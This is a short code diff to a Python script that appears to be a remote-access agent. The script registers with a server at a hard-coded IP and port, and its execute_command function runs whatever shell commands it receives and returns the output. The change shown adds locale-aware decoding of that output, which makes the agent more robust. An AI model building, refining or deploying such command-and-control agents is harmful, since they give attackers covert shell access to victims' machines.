@@ -1,4 +1,4 @@
-import subprocess, time, uuid, socket, requests, platform, base64
+import subprocess, time, uuid, socket, requests, platform, base64, locale
 
 SERVER_HOST = "192.168.1.69"  
 SERVER_PORT = 6655            
@@ -106,10 +106,10 @@ def execute_command(command):
         result = subprocess.check_output(
             command, shell=True, stderr=subprocess.STDOUT
         )
-        return result.decode(errors="ignore")
+        return result.decode(locale.getpreferredencoding(False), errors="ignore")
     except subprocess.CalledProcessError as e:
-        return e.output.decode(errors="ignore")
-
+        return e.output.decode(locale.getpreferredencoding(False), errors="ignore")
+    
 if __name__ == "__main__":
     try:
         register_agent()
